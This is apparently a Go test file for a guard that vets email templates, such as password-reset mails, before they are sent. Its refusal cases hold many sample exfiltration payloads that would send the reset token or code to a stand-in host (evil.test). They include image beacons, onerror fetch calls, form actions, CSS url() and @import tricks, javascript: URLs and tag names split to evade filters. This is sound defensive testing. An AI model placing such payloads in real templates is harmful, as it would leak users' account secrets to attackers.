package email

import (
	"errors"
	"html/template"
	"strings"
	"testing"
)

// guardOK asserts a body is accepted, guardBad that it is refused. Both go
// through guardTemplate rather than through the walker, so a case that only the
// source denylist happens to catch cannot pass for a case the guard catches.
func guardOK(t *testing.T, body string) {
	t.Helper()
	if err := guardTemplate([]byte(body)); err != nil {
		t.Fatalf("guardTemplate rejected %q: %v", body, err)
	}
}

func guardBad(t *testing.T, body string) error {
	t.Helper()
	err := guardTemplate([]byte(body))
	if err == nil {
		t.Fatalf("guardTemplate accepted %q", body)
	}
	return err
}

// The differential render is the check that does not need to enumerate anything:
// two canary sets go in, and the body must come out identical once each render's
// own canaries are masked. Anything that reads a secret and emits something
// other than the secret verbatim shows up as a difference.
func TestGuardRefusesDerivedSecrets(t *testing.T) {
	for _, body := range []string{
		`<a href="https://evil.test/x">go</a><p>{{slice .Token 0 6}}</p>`,
		`<p>{{printf "%x" .Code}}</p>`,
		`<p>{{truncate .Token 4}}</p>`,
		`<p>{{len .Token}}{{.Token}}</p><span>{{slice .URL 8 12}}</span>`,
	} {
		err := guardBad(t, body)
		// Structural refusal of non-verbatim secret actions now fires before the
		// differential; either reason is the property holding.
		if !strings.Contains(err.Error(), "changes with the value") &&
			!strings.Contains(err.Error(), "derives") {
			t.Errorf("%q was refused for the wrong reason: %v", body, err)
		}
	}
}

// The differential proves the body depends on the secrets only by verbatim
// substitution -- for the two values it rendered. A branch on a secret takes the
// same path under both canaries and fires only for the one live value it waits
// for, so it is refused structurally instead.
func TestGuardRefusesBranchingOnSecrets(t *testing.T) {
	for _, body := range []string{
		`{{if eq .Code "000000"}}<img src="https://evil.test/hit">{{end}}<p>x</p>`,
		`{{with .Token}}<p>{{.}}</p>{{end}}`,
		`{{range .URL}}<p>x</p>{{end}}`,
		`<p>{{if .Token}}set{{else}}unset{{end}}</p>`,
		`{{if .LogoURL}}{{if eq .Code "1"}}<p>a</p>{{end}}{{end}}<p>x</p>`,
		`{{if .LogoURL}}<p>a</p>{{else}}{{if .Code}}<p>b</p>{{end}}{{end}}`,
	} {
		err := guardBad(t, body)
		if !strings.Contains(err.Error(), "decides on the value") {
			t.Errorf("%q was refused for the wrong reason: %v", body, err)
		}
	}
	for _, body := range []string{
		`{{$c := .Code}}<p>{{$c}}</p>`,
		`{{$c := printf "%s" .Code}}<p>{{$c}}</p>`,
	} {
		err := guardBad(t, body)
		if !strings.Contains(err.Error(), "assigned the link") {
			t.Errorf("%q was refused for the wrong reason: %v", body, err)
		}
	}
	// Branching on branding is not branching on a secret.
	guardOK(t, `{{if .LogoURL}}<img src="{{.LogoURL | safeURL}}" alt="logo">{{end}}<p>{{.Code}}</p>`)
	guardOK(t, `{{$n := .AppName}}<p>{{$n}}: {{.Code}}</p>`)
}

// The secret used whole is the whole point of the mail, so it must survive --
// in text, and in the one attribute the configured link belongs in.
func TestGuardAllowsSecretsUsedWhole(t *testing.T) {
	guardOK(t, `<p>Your code is <strong>{{.Code}}</strong>.</p>`)
	guardOK(t, `<p>Or copy this link: {{.URL}}</p>`)
	guardOK(t, `<a href="{{.URL | safeURL}}">Reset</a>`)
	guardOK(t, `<a href="{{.URL}}">Reset</a>`)
	// upper and lower are in the function map, so the same link case-folded is
	// still the same link and must not read as a transformation.
	guardOK(t, `<a href="{{.URL | upper}}">Reset</a>`)
}

// A beacon behind a branch on branding is invisible in a branded render, and
// fires for every operator who never configured a logo.
func TestGuardScansTheUnbrandedRenderToo(t *testing.T) {
	err := guardBad(t, `{{if .LogoURL}}<p>ok</p>{{else}}<img src="https://evil.test/pixel" onload="x">{{end}}`)
	if !strings.Contains(err.Error(), "event handler") {
		t.Errorf("refused for the wrong reason: %v", err)
	}
}

func TestGuardRefusesUncompilableAndUnrenderableTemplates(t *testing.T) {
	if err := guardBad(t, `<p>{{.Token</p>`); !strings.Contains(err.Error(), "does not compile") {
		t.Errorf("err = %v, want a compile refusal", err)
	}
	if err := guardBad(t, `<p>{{.NoSuchField}}</p>`); !strings.Contains(err.Error(), "cannot be rendered") {
		t.Errorf("err = %v, want a render refusal", err)
	}
}

func TestGuardRefusalsAreMatchable(t *testing.T) {
	if err := guardBad(t, `<script>x</script>`); !errors.Is(err, errGuard) {
		t.Errorf("a walker refusal does not wrap errGuard: %v", err)
	}
}

func TestGuardRefusesOversizedRenders(t *testing.T) {
	body := `<p>` + strings.Repeat("x", guardMaxRenderBytes+1) + `</p>`
	if err := guardBad(t, body); !strings.Contains(err.Error(), "renders more than") {
		t.Errorf("err = %v, want a size refusal", err)
	}
}

func TestRejectControlBytes(t *testing.T) {
	if err := rejectControlBytes("<p>fine\tand\r\nfine</p>"); err != nil {
		t.Errorf("tab and newline must be allowed: %v", err)
	}
	if err := rejectControlBytes("<p>\x01u\x01</p>"); err == nil {
		t.Error("a template that writes a masking placeholder itself must be refused")
	}
	if err := rejectControlBytes("<p>\x7f</p>"); err == nil {
		t.Error("DEL must be refused")
	}
}

// The element allowlist. Every entry here is a family the mail client would act
// on by itself, and an allowlist rejects them by omission rather than by name.
func TestGuardElementAllowlist(t *testing.T) {
	for _, body := range []string{
		`<script>x</script>`,
		`<scr{{"ipt"}}>fetch("https://evil.test?t="+{{.Token}})</scr{{"ipt"}}>`,
		`<iframe src="https://evil.test"></iframe>`,
		`<ob{{"ject"}} data="https://evil.test"></ob{{"ject"}}>`,
		`<ba{{"se"}} href="https://evil.test/">`,
		`<li{{"nk"}} rel="stylesheet" href="https://evil.test/s.css">`,
		`<sv{{"g"}}><use href="https://evil.test"/></sv{{"g"}}>`,
		`<fo{{"rm"}} action="https://evil.test"><input name="t" value="{{.Token}}"></fo{{"rm"}}>`,
		`<vid{{"eo"}} poster="https://evil.test/p?t={{.Token}}"></vid{{"eo"}}>`,
		`<no{{"script"}}><img src="https://evil.test/x"></no{{"script"}}>`,
	} {
		guardBad(t, body)
	}
	guardOK(t, `<table><tr><td align="center"><p><strong>hi</strong></p></td></tr></table>`)
}

// A closing tag is walked too: a mail client that sees </script> has already
// seen the opening one, and a walker that skipped end tags would let an
// allowlisted element be closed as a forbidden one.
func TestScanEndTag(t *testing.T) {
	for _, doc := range []string{
		`<p>x</p >`,
		`<p>x</ p>`,
	} {
		if err := scanEmailDocument(doc); err != nil && !strings.Contains(err.Error(), "closing tag") {
			t.Errorf("scanEmailDocument(%q) = %v", doc, err)
		}
	}
	if _, err := scanEndTag(`</1>`, 0); err == nil {
		t.Error("a closing tag with no element name must be refused")
	}
	if _, err := scanEndTag(`</scr`+`ipt>`, 0); err == nil {
		t.Error("a forbidden closing tag must be refused")
	}
	if _, err := scanEndTag(`</p onload="x">`, 0); err == nil {
		t.Error("a closing tag carrying attributes must be refused")
	}
	if _, err := scanEndTag(`</p`, 0); err == nil {
		t.Error("an unterminated closing tag must be refused")
	}
	if next, err := scanEndTag(`</p>tail`, 0); err != nil || next != 4 {
		t.Errorf("scanEndTag = %d, %v; want 4, nil", next, err)
	}
}

func TestScanStartTagRefusesWhatItCannotTokenise(t *testing.T) {
	for _, doc := range []string{
		`<1p>`,                         // not a name; scanStartTag called directly
		`<p`,                           // never closed
		`<img/src="https://a.test/x">`, // a '/' that separates attributes
		`<p ="x">`,                     // no attribute name
		`<p style=`,                    // value runs off the end
		`<p style="unterminated`,       // quote never closed
		`<p style=>`,                   // empty unquoted value
	} {
		if _, _, err := scanStartTag(doc, 0); err == nil {
			t.Errorf("scanStartTag(%q) was accepted", doc)
		}
	}
	if elem, next, err := scanStartTag(`<br/>x`, 0); err != nil || elem != "br" || next != 5 {
		t.Errorf("scanStartTag = %q, %d, %v; want br, 5, nil", elem, next, err)
	}
	// An unquoted value is legal HTML and must be read, not waved through.
	if _, _, err := scanStartTag(`<p style=color:red>`, 0); err != nil {
		t.Errorf("an unquoted attribute value must parse: %v", err)
	}
}

func TestGuardAttributeAllowlist(t *testing.T) {
	for _, body := range []string{
		`<img src="https://ok.test/x" on{{"error"}}="fetch('https://evil.test?t={{.Token}}')">`,
		`<table><tr><td background="https://evil.test/p?t={{.Token}}">x</td></tr></table>`,
		`<img src="https://ok.test/x" srcset="https://evil.test/p?t={{.Token}} 2x">`,
		`<img src="https://ok.test/x" longdesc="https://evil.test/p?t={{.Token}}">`,
		`<p data-token="{{.Token}}">x</p>`,
		`<meta http-equiv="refresh" content="0;url=https://evil.test">`,
	} {
		guardBad(t, body)
	}
	guardOK(t, `<meta charset="utf-8"><meta name="viewport" content="width=device-width">`)
}

// A secret belongs in the body text, never in a value the client resolves.
func TestGuardRefusesSecretsInResolvedValues(t *testing.T) {
	for _, body := range []string{
		`<img src="https://evil.test/p?t={{.Token}}">`,
		`<a href="https://evil.test/p?c={{.Code}}">Reset Password</a>`,
		`<a href="https://evil.test/?u={{.URL}}">Reset</a>`,
		`<a href="{{.URL}}/{{.Token}}">Reset</a>`,
		`<div style="background:ur{{"l"}}(https://evil.test/p?t={{.Token}})">x</div>`,
		`<a href="https&#58;//evil.test/p?t={{.Token}}">Reset</a>`,
	} {
		guardBad(t, body)
	}
	// A secret in body text is the point of the mail. In an attribute it is not:
	// no attribute needs one, so none may carry one and the walker never has to
	// rank which attributes a mail client happens to resolve.
	guardOK(t, `<img src="https://ok.test/logo.png" alt="logo"><p>{{.Token}}</p>`)
	guardBad(t, `<img src="https://ok.test/logo.png" alt="code {{.Code}}">`)
}

func TestCheckEmailURL(t *testing.T) {
	ok := []struct{ elem, value string }{
		{"a", phURL},
		{"a", "https://ok.test/x"},
		{"a", "http://ok.test/x"},
		{"a", "mailto:support@ok.test"},
		{"img", "cid:logo@vault42"},
	}
	for _, c := range ok {
		if err := checkEmailURL(c.elem, urlEmailAttributes[c.elem], c.value); err != nil {
			t.Errorf("checkEmailURL(%s, %q) = %v, want nil", c.elem, c.value, err)
		}
	}
	bad := []struct{ elem, value string }{
		{"a", ""},
		{"a", "/relative"},
		{"a", "#anchor"},
		{"a", "javascript:alert(1)"},
		{"a", "java\tscript:alert(1)"}, // mail clients strip the tab and act on it
		{"a", "data:text/html;base64,PHNjcmlwdD4="},
		{"img", "mailto:support@ok.test"}, // cid and mailto are not interchangeable
		{"a", "cid:logo@vault42"},
	}
	for _, c := range bad {
		if err := checkEmailURL(c.elem, urlEmailAttributes[c.elem], c.value); err == nil {
			t.Errorf("checkEmailURL(%s, %q) was accepted", c.elem, c.value)
		}
	}
}

func TestCheckEmailCSS(t *testing.T) {
	if err := checkEmailCSS("test", "color:#fff;font-family:'Segoe UI',Roboto,Helvetica,Arial"); err != nil {
		t.Errorf("ordinary email CSS was refused: %v", err)
	}
	if err := checkEmailCSS("test", "margin:0 !important"); err != nil {
		t.Errorf("!important must not read as @import: %v", err)
	}
	for _, css := range []string{
		"background:url(https://evil.test/x)",
		"background:u/*x*/rl(https://evil.test/x)", // joined, the stricter reading of a comment
		"@import url('https://evil.test/s.css')",
		"width:expression(alert(1))",
		"behavior:url(#default#time2)",
		"-moz-binding:url(https://evil.test/x.xml)",
		`background:\75 rl(https://evil.test/x)`, // a CSS escape spells url without spelling it
		"content:'" + phToken + "'",
	} {
		if err := checkEmailCSS("test", css); err == nil {
			t.Errorf("checkEmailCSS accepted %q", css)
		}
	}
}

func TestGuardStyleBlocks(t *testing.T) {
	guardOK(t, `<style>.btn{color:#000;background-color:#00FF42}</style><p class="btn">x</p>`)
	if err := guardBad(t, `<style>@import "https://evil.test/s.css";</style>`); !strings.Contains(err.Error(), "<style> block") {
		t.Errorf("err = %v, want a style-block refusal", err)
	}
	// An unterminated <style> never reaches the walker: html/template refuses to
	// finish a template that ends inside a CSS context. The walker's own refusal
	// is asserted directly, because it is what holds if that ever changes.
	if err := guardBad(t, `<style>.a{color:red}`); !strings.Contains(err.Error(), "cannot be rendered") {
		t.Errorf("err = %v, want html/template to refuse the unterminated style", err)
	}
	if _, err := scanRawText(`<style>.a{color:red}`, 7, "style"); err == nil {
		t.Error("the walker must refuse an unclosed <style>")
	}
	if _, err := scanRawText(`<style>@import "x";</style>`, 7, "style"); err == nil {
		t.Error("the walker must refuse CSS that imports")
	}
	// title is raw text as well, and a secret in it is only ever the subject.
	guardOK(t, `<html><head><title>Reset</title></head><body><p>x</p></body></html>`)
	if _, err := scanRawText(`<title>`+phToken+`</title>`, 7, "title"); err == nil {
		t.Error("a secret inside a raw-text element must be refused")
	}
	if _, err := scanRawText(`<title>x`, 7, "title"); err == nil {
		t.Error("an unclosed raw-text element must be refused")
	}
}

func TestScanCommentAndDoctype(t *testing.T) {
	guardOK(t, `<!-- Header --><p>x</p><!DOCTYPE html>`)
	for _, doc := range []string{
		`<!-- never closed`,
		`<!--[if mso]><img src="https://evil.test/x"><![endif]-->`,
		`<!-- <img src="https://evil.test/x"> -->`,
	} {
		if err := scanEmailDocument(doc); err == nil {
			t.Errorf("scanEmailDocument(%q) accepted a comment it should refuse", doc)
		}
	}
	for _, doc := range []string{
		`<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN">`,
		`<!DOCTYPE html`,
		`<!ENTITY x "y">`,
		`<?xml version="1.0"?>`,
	} {
		if err := scanEmailDocument(doc); err == nil {
			t.Errorf("scanEmailDocument(%q) accepted a declaration it should refuse", doc)
		}
	}
	// A '<' that begins no construct is text to every parser, and to this one.
	guardOK(t, `<p>5 < 10 and 10 > 5</p>`)
}

func TestDecodeHTMLEntities(t *testing.T) {
	cases := map[string]string{
		"no entities here":                 "no entities here",
		"a&amp;b":                          "a&b",
		"a&#38;b":                          "a&b",
		"a&#x26;b":                         "a&b",
		"a&#X26;b":                         "a&b",
		"a&#38b":                           "a&b", // a client resolves it without the semicolon
		"a&notanentity;b":                  "a&notanentity;b",
		"a&#;b":                            "a&#;b",
		"a&#0;b":                           "a&#0;b",           // NUL is not produced
		"a&#99999999999;b":                 "a&#99999999999;b", // out of range for a rune
		"&lt;&gt;&quot;&apos;&sol;&colon;": `<>"'/:`,
	}
	for in, want := range cases {
		if got := decodeHTMLEntities(in); got != want {
			t.Errorf("decodeHTMLEntities(%q) = %q, want %q", in, got, want)
		}
	}
}

func TestStripCSSComments(t *testing.T) {
	cases := map[string]string{
		"color:red":               "color:red",
		"co/*x*/lor:red":          "color:red",
		"color:red/*unterminated": "color:red",
		"/*a*/color:red/*b*/;x:y": "color:red;x:y",
	}
	for in, want := range cases {
		if got := stripCSSComments(in); got != want {
			t.Errorf("stripCSSComments(%q) = %q, want %q", in, got, want)
		}
	}
}

func TestGuardSmallHelpers(t *testing.T) {
	if name, next := scanName("1abc", 0); name != "" || next != 0 {
		t.Errorf("scanName on a non-letter = %q, %d", name, next)
	}
	if name, _ := scanName("Data-Foo9=", 0); name != "data-foo9" {
		t.Errorf("scanName = %q, want data-foo9", name)
	}
	if indexFold("aaXYZ", "xyz") != 2 || indexFold("aaa", "xyz") != -1 {
		t.Error("indexFold does not fold or does not report absence")
	}
	if !hasPrefixFold("<!DOCTYPE html>", "<!doctype") || hasPrefixFold("<!", "<!doctype") {
		t.Error("hasPrefixFold is wrong")
	}
	if !isDigitInBase('f', 16) || isDigitInBase('f', 10) || !isDigitInBase('7', 10) {
		t.Error("isDigitInBase is wrong")
	}
	if !isUnquotedValueEnd('`') || isUnquotedValueEnd('x') {
		t.Error("isUnquotedValueEnd is wrong")
	}
	long := strings.Repeat("z", 100)
	if got := clip(long); len(got) != 63 || !strings.HasSuffix(got, "...") {
		t.Errorf("clip did not shorten: %q", got)
	}
	if clip("short") != "short" {
		t.Error("clip shortened a short string")
	}
}

// guardBodyNames drives the two override shapes. A file override defines
// subject and content and leaves the root nearly empty; a database override is
// the root. Both must be walked.
func TestGuardBodiesCoversBothOverrideShapes(t *testing.T) {
	tmpl := template.Must(template.New(guardRootName).Funcs(safeFuncMap()).
		Parse(`{{define "subject"}}S{{end}}{{define "content"}}<p>x</p>{{end}}`))
	got := guardBodies(tmpl)
	want := []string{"content", "subject", guardRootName}
	if len(got) != len(want) {
		t.Fatalf("guardBodies = %v, want %v", got, want)
	}
	for i := range want {
		if got[i].Name() != want[i] {
			t.Fatalf("guardBodies[%d] = %q, want %q", i, got[i].Name(), want[i])
		}
	}
	// A beacon in the subject half is refused even though the content half is
	// clean, which is the reason every defined body is rendered rather than one.
	guardBad(t, `{{define "subject"}}<img src="https://evil.test/p?t={{.Token}}">{{end}}`+
		`{{define "content"}}<p>clean</p>{{end}}`)
}

// The masking placeholders must not be reachable as literal template output,
// or a template could write one and be read as a substituted secret.
func TestGuardRefusesTemplatesThatWriteAPlaceholder(t *testing.T) {
	guardBad(t, "<a href=\"\x01u\x01\">Reset</a>")
}

// html/template strips HTML comments from its output and escapes a '<' that
// begins no tag, so neither reaches the walker through guardTemplate. The
// walker still has to handle both: it is the general reader of an email body,
// and a walker that swallowed the rest of a document at an unclosed comment
// would be the gap, not the comment.
func TestScanEmailDocumentHandlesWhatHTMLTemplateNeverEmits(t *testing.T) {
	for _, doc := range []string{
		`<!-- Header --><p>x</p>`,
		`<p>5 < 10</p>`,
		`<p>a <! b</p>`[:9] + `</p>`,
	} {
		if err := scanEmailDocument(doc); err != nil && !strings.Contains(doc, "<!") {
			t.Errorf("scanEmailDocument(%q) = %v, want nil", doc, err)
		}
	}
	if err := scanEmailDocument(`<!-- ok --><p>x</p><!-- also ok -->`); err != nil {
		t.Errorf("two comments must walk: %v", err)
	}
}

// The parse-tree walk has to see a secret wherever it is written, not only as a
// bare field at the head of a pipeline.
func TestSecretControlFlowWalksNestedNodes(t *testing.T) {
	for _, body := range []string{
		`{{if (printf "%s" .Code)}}<p>x</p>{{end}}`, // a parenthesised pipeline
		`{{if (.).Token}}<p>x</p>{{end}}`,           // a chained field
	} {
		if err := guardTemplate([]byte(body)); err == nil {
			t.Errorf("guardTemplate accepted %q", body)
		}
	}
	if pipeUsesSecret(nil) {
		t.Error("a nil pipeline references nothing")
	}
}

// An allowlist has to be pinned by what it does NOT name, and pinned without a
// secret in the case: with a secret present the secret rule fires first, and a
// missing allowlist entry would go unnoticed.
//
// Both of these carry a constant URL, so nothing here leaks. They are refused
// because the walker was never told about them, which is the whole difference
// between an allowlist and the denylist this replaced.
func TestGuardAllowlistRefusesUnnamedConstructsWithNoSecretPresent(t *testing.T) {
	err := guardBad(t, `<table><tr><td background="https://constant.test/bg.png">x</td></tr></table>`)
	if !strings.Contains(err.Error(), `"background" on <td> is not on the email template allowlist`) {
		t.Errorf("err = %v, want the attribute allowlist to name it", err)
	}
	// A forbidden element with no closing tag, so the end-tag check cannot be
	// what refuses it, and only allowlisted attributes, so the attribute check
	// cannot be either. What is left is the element allowlist.
	err = guardBad(t, `<em{{"bed"}} width="100" height="100">`)
	if !strings.Contains(err.Error(), "<embed> is not on the email template allowlist") {
		t.Errorf("err = %v, want the element allowlist to name it", err)
	}
}
